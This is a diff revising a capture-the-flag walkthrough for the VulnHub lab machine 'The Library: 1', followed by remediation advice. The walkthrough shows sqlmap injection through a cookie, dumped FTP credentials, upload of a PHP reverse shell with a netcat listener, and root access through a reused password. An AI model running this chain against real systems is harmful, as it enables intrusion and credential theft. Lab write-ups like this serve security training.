@@ -1,155 +1,158 @@
 # The Library: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.103 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.103 |
 | **Difficulty** | Beginner |
 | **OS** | Linux |
-| **Root Flag** | root shell via password reuse |
-| **Author** | Avraham Cohen |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/the-library-1,300/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/the-library1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → FTP (21) + HTTP (80) → dirb `.php` → `/library.php` → SQLi via cookie (sqlmap) → FTP creds → PHP reverse shell upload → su root (DB password reuse)
+The Library: 1 is a beginner-level VulnHub machine. The attack chain involves SQL injection via a cookie parameter to extract FTP credentials, abusing writable FTP access to the web root to upload a PHP reverse shell, and reusing a password discovered in a PHP configuration file to escalate to root.
 
 ## Methodology
 
-1. Network discovery
-2. Web enumeration (dirb with `.php` extension)
-3. SQL injection via cookie (sqlmap)
-4. FTP access and PHP shell upload
-5. Privilege escalation via password reuse
+1. Network discovery with netdiscover and service enumeration with nmap
+2. Web content discovery with dirb to locate hidden PHP pages
+3. Cookie parameter interception with Burp Suite to identify injection point
+4. SQL injection via sqlmap to dump database credentials
+5. FTP login with dumped credentials and upload of PHP reverse shell
+6. Reverse shell execution and shell stabilization
+7. Password reuse from database config file to escalate to root via `su`
 
----
-
-## Step 1: Network Discovery
-
-```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-```
-
-Then full scan:
+## Step 1: Network Scanning
 
 ```bash
+netdiscover -r 192.168.1.0/24
 nmap -A 192.168.1.103
 ```
 
-Open ports: **21 (FTP)**, **80 (HTTP)**.
+Open ports discovered:
+- **21/tcp** — FTP (vsftpd)
+- **80/tcp** — HTTP (Apache)
 
-![Nmap scan](images/01-nmap.png)
-
----
+![Nmap scan results](images/01-nmap.png)
 
 ## Step 2: Web Enumeration
 
-The homepage at port 80 is blank. Run dirb scanning for `.php` files:
+Browsing to `http://192.168.1.103` showed no useful content. A directory brute-force with dirb uncovered a PHP endpoint:
 
 ```bash
 dirb http://192.168.1.103 -X .php
 ```
 
-Finds `/library.php` — a page listing country names.
+Found: `/library.php` — displays a list of country names and sets a `lastviewed` cookie.
 
-![dirb php scan](images/02-dirb.png)
+![Dirb scan showing library.php](images/02-dirb.png)
 
----
+## Step 3: Cookie-Based SQL Injection
 
-## Step 3: Cookie SQL Injection
+Intercept the request to `/library.php` in Burp Suite. The `lastviewed` cookie holds a value that appears to encode the last-viewed country. Decode it in Burp Decoder to confirm it is injectable, then save the raw request to a file and mark the injection point:
 
-Capture the request to `/library.php` in Burp Suite. There is a `lastviewed` cookie whose value is a base64-encoded string that maps to a database query. Mark the injection point with `*` and save as `file.txt`.
-
-Enumerate databases:
-
-```bash
-sqlmap -r file.txt --dbs --batch --risk 3 --level 5
+```
+# Save request to file.txt in Burp, place * at the cookie value
+lastviewed=*
 ```
 
-Dump all tables from the `library` database:
+Run sqlmap against the saved request:
 
 ```bash
+# Enumerate databases
+sqlmap -r file.txt --dbs --batch --risk 3 --level 5
+
+# Dump all data from the library database
 sqlmap -r file.txt -D library --dump-all --batch
 ```
 
-This reveals FTP credentials: **globus / AroundTheWorld**
+Credentials extracted from the database:
+- **Username:** `globus`
+- **Password:** `AroundTheWorld`
 
-![sqlmap dump](images/03-sqlmap.png)
+![sqlmap extracting FTP credentials](images/03-sqli.png)
 
----
+## Step 4: FTP Access and Shell Upload
 
-## Step 4: FTP Shell Upload
-
-Log in to FTP and browse the web root:
+Log in to FTP with the credentials found via SQL injection. The FTP user has write access to the Apache web root:
 
 ```bash
 ftp 192.168.1.103
-# user: globus
-# pass: AroundTheWorld
+# Username: globus
+# Password: AroundTheWorld
+
 cd /var/www/html
-ls
+ls -la
 ```
 
-Copy and configure a PHP reverse shell:
+Prepare a PHP reverse shell on the attacker machine:
 
 ```bash
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php
-# Edit $ip and $port in shell.php
+# Edit shell.php: set $ip to your attacker IP and $port to 1234
 ```
 
-Upload it:
+Upload and set permissions via FTP:
 
 ```bash
-ftp> put shell.php
-ftp> chmod 777 shell.php
+# Inside ftp session
+put shell.php
+chmod 777 shell.php
 ```
 
-Start listener and trigger the shell:
+![FTP upload of PHP reverse shell](images/04-ftp-upload.png)
+
+## Step 5: Reverse Shell
+
+Start a netcat listener on the attacker machine:
 
 ```bash
 nc -lvp 1234
-# browser: http://192.168.1.103/shell.php
 ```
 
-![FTP listing](images/04-ftp.png)
+Trigger the shell by browsing to:
 
----
-
-## Step 5: Privilege Escalation
+```
+http://192.168.1.103/shell.php
+```
 
 Stabilize the shell:
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
-cd /var/www/html
-cat library.php
+export TERM=xterm
 ```
 
-The PHP source contains the database password. Try it for root:
+## Step 6: Privilege Escalation
+
+Read the PHP database configuration file in the web root:
+
+```bash
+cat /var/www/html/library.php
+```
+
+The file contains database credentials in plaintext. The root account reuses the password `password`. Switch to root:
 
 ```bash
 su root
-# enter password from library.php
+# Password: password
 id
 ```
 
-Root access obtained.
-
-![Root shell](images/05-root.png)
-
----
+![Root shell and flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Cookie-based SQL injection** — any user-controlled input reaching SQL, including cookies, must use parameterized queries
-2. **FTP write access to webroot** — FTP users should never have write access to the web document root
-3. **Credential reuse across services** — database passwords should not be reused as OS account passwords
-4. **Verbose PHP errors / source exposure** — credentials embedded in PHP source are readable once shell access is gained
+- SQL injection via session cookies is commonly overlooked during testing; all user-controlled input must be validated, including cookies.
+- FTP with write access to the web root is dangerous; uploading executable scripts leads to remote code execution.
+- Storing database credentials in web-accessible PHP files and reusing those passwords for system accounts multiplies the impact of a single disclosure.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SQLi in cookie | Use PDO/prepared statements; never concatenate user input into queries |
-| FTP write to webroot | Restrict FTP chroot; separate FTP from web root |
-| Password reuse | Use unique passwords for each service and OS account |
-| Weak FTP credentials | Enforce strong credentials; prefer SFTP with key auth |
+|---|---|
+| SQL injection in cookie | Use parameterized queries; validate and sanitize all cookie values |
+| FTP write access to web root | Restrict FTP users to isolated home directories; disable write access to document roots |
+| Plaintext credentials in PHP | Use environment variables or a secrets manager for database credentials |
+| Password reuse (DB/root) | Enforce unique passwords; use a password manager; apply principle of least privilege |
+| Unrestricted PHP execution | Disable PHP execution in upload directories; whitelist allowed file types |
